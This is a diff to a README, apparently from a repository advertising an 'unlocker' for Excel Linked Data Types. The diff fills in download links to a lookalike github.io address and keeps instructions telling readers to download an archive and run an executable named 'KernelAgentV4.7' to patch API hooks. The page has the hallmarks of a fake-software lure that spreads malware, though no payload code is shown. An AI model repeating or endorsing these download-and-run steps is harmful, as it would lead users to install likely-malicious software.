@@ -2,13 +2,15 @@
 
 This tool unlocks full access to Excel’s **Linked Data Types** such as Stocks, Geography, Currencies, and more – even on devices without a Microsoft account or internet connection. Designed for Microsoft 365 and Office 2021 builds.
 
-[![Download Unlocker](https://img.shields.io/badge/Download-DataTypes_Unlocker-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Unlocker](https://img.shields.io/badge/Download-DataTypes_Unlocker-blueviolet)](https://m365-linked-data-types-unlocke.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-linked-data-types-unlocke.github.io/.github
+) section  
 2. 📁 **Extract the folder** to `C:\DataTypesUnlocker` or another location  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` (required to patch API hooks and enable data types locally)  
 4. 🧠 Open Excel and select a cell with text like “Amazon” or “France”  
